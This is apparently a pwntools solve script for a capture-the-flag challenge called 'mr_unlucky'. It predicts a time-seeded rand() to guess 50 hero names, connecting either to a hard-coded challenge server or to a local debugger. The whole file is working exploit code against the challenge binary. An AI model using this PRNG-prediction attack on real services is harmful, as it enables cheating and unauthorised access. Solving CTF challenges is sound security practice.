from pwn import *
from ctypes import cdll

context.binary = './mr_unlucky'
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('52.59.124.14', 5021)
else:
    # probably not gonna work, too slow
    r = gdb.debug('./mr_unlucky', '''
                                b *main+0x7C
                                c ''')
    
libc = cdll.LoadLibrary('libc.so.6')
libc.srand(libc.time(0))

heroes = [
    'Anti-Mage',
    'Axe',
    'Bane',
    'Bloodseeker',
    'Crystal Maiden',
    'Drow Ranger',
    'Earthshaker',
    'Juggernaut',
    'Mirana',
    'Morphling',
    'Phantom Assassin',
    'Pudge',
    'Shadow Fiend',
    'Sniper',
    'Storm Spirit',
    'Sven',
    'Tiny',
    'Vengeful Spirit',
    'Windranger',
    'Zeus'
]

for i in range(50):
    r.recvuntil(b': ')
    r.sendline(heroes[libc.rand() % 20].encode())

r.interactive()
